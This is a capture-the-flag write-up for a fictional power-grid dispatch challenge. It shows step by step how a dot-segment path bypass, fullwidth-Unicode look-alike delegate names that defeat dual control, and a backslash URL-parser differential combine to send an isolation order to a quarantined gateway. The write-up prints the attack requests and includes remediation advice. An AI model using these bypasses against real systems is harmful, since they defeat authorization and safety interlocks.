### Keld Ridge / Velmara — Dispatcher Isolation Order

> [fill in] · [fill in] · [fill in]
> Points at solve: [fill in]

**Tools used**

`curl --path-as-is` / raw `http.client`; sha256-hex tooling; `fast-uri` vs WHATWG/undici URL-parser differential analysis.

**Approach**

The reliability console (`/`) is a read-only observer desk. It loads `/api/v1/schema`, `/reference/roster` and `/audit/ledger`.

- `cluster`: substation `KELD RIDGE`, buses `KR-B1`,`KR-B2`, gateway `sg-kr.grid.test`.
- `dual_control`: requester + approver both on the engineer roster, distinct.
- `delegates.uniqueness`: `casefold`.
- `edge.policy`: "authorizes on the request path as received".
- `dispatch.target_validation`: `fast-uri` `3.1.2`.
- `dispatch.release_unlock`: `sha256-hex` over `interlock|<order_id>|<bus identifiers joined by comma>`.

Roster: `k.vostra`, `r.mendal`, `a.torvo` (matching `NFKC+casefold`). The ledger shows `k.vostra` added the Keld Ridge gateway to quarantine at 02:48Z. The instance under test was `<instance>`.

Three separate controls had to be defeated to get a signed isolation order to the substation gateway:

1. **Edge path bypass.** Direct `/ops/*` calls return `403 policy.path_restricted`. The edge authorizes on the raw request path, while the Express backend normalizes dot-segments. Sending the path with dot-segments bypasses the raw-path check and the backend normalizes the route:

   ```
   POST /app/../ops/delegates            (curl --path-as-is / raw http.client)
   ```

2. **Dual control via NFKC variants.** Exact roster names are pre-provisioned (409 `principal.exists`) and their tokens are unknown. Delegate creation dedups with `casefold` only, so fullwidth characters that NFKC-normalize to ASCII are accepted as new principals, while approval matching (NFKC + casefold) maps them back onto the roster. Created three delegates:

   - `k.vostrａ` (U+FF41 fullwidth a) → token `<requester-token>` — requester
   - `ｒ.mendal` (U+FF52 fullwidth r) → token `<approver-token>` — approver
   - `r.mendaｌ` (U+FF4C fullwidth l) → token `<spare-token>` (spare)

   These are two distinct principals matching two distinct rostered engineers, so the dual-control check passes.

3. **Signed order.**

   ```
   POST /app/../ops/orders
   {"bus":["KR-B1","KR-B2"],"requester_token":"<requester-token>"}   → ord-5, status pending
   POST /app/../ops/orders/approve
   {"order_id":"ord-5","approver_token":"<approver-token>"}         → ord-5, status signed
   ```

   `bus` must be an array; a string returns `{"error":"bad_bus"}`.

   Unlock digest:

   ```
   sha256("interlock|ord-5|KR-B1,KR-B2")
   = 92992fa42a147f608fce543b8f46f655a7d676cada8ea15de3fb0911306524b3
   ```

4. **Quarantine bypass (fast-uri vs WHATWG).** Dispatch validates `target` with `fast-uri`, whose authority ends only at `/`, `?` or `#` per RFC 3986 — it does **not** treat `\` as a delimiter. Node's fetch uses the WHATWG URL parser, which for special schemes treats `\` as `/`. So with:

   ```
   http://sg-kr.grid.test\dispatch
   ```

   - fast-uri sees host `sg-kr.grid.test\dispatch` → not on the quarantine list.
   - WHATWG/undici sees host `sg-kr.grid.test`, path `/dispatch` → request reaches the gateway.

   Scheme matters only for reachability: `https://...` failed with `502 gateway_unreachable` (TLS against the plain-HTTP gateway); the terminal backslash variant `http://sg-kr.grid.test\` (path `/`) returned a generic `500 internal_error` from a non-`/dispatch` gateway route. The gateway's dispatch route is `/dispatch`.

5. **Receipt.**

   ```
   POST /app/../ops/dispatch
   {"order_id":"ord-5",
    "target":"http://sg-kr.grid.test\\dispatch",
    "unlock":"92992fa42a147f608fce543b8f46f655a7d676cada8ea15de3fb0911306524b3"}
   ```

   Response:

   ```json
   {"order_id":"ord-5","status":"delivered",
    "receipt":{"bus":["KR-B1","KR-B2"],"order_id":"ord-5",
               "receipt":"isolation executed",
               "release_token":"CSCTF{REDACTED}",
               "station":"KELD RIDGE"}}
   ```

**Why it works**

1. Edge policy authorized the raw wire path while the backend routed on the normalized path — a parser differential between policy enforcement and routing.
2. Delegate uniqueness was enforced with `casefold` only, but roster matching used NFKC + casefold, so fullwidth variants were distinct at creation yet identical at approval — a normalization mismatch across two checks.
3. Dispatch validated the target with `fast-uri` (RFC 3986, `\` not a delimiter) but fetched it with WHATWG/undici (`\` treated as `/` for special schemes), so the validated host string and the actually-connected host differed — the quarantined gateway was reachable despite the block.

Remediation:

- Authorize on the *normalized/canonical* path (resolve dot-segments before policy), and reject encoded/raw-path mismatches instead of trusting the wire path.
- Use a single Unicode normalization policy for both uniqueness and roster matching (NFKC + casefold everywhere); reject non-NFC delegate names.
- Validate and fetch with the same URL parser, or validate the *fetch-parsed* host after canonicalization; never compare a raw-authority string from a permissive RFC 3986 parser against a WHATWG-derived policy.
- Deny requests to quarantined hosts by resolved destination (IP/port allowlist), not by the pre-parse hostname string.

**Validation**

The dispatch call returned `status: delivered` with a receipt (`receipt: "isolation executed"`, `station: "KELD RIDGE"`) and a `release_token` containing the flag, `CSCTF{REDACTED}`.
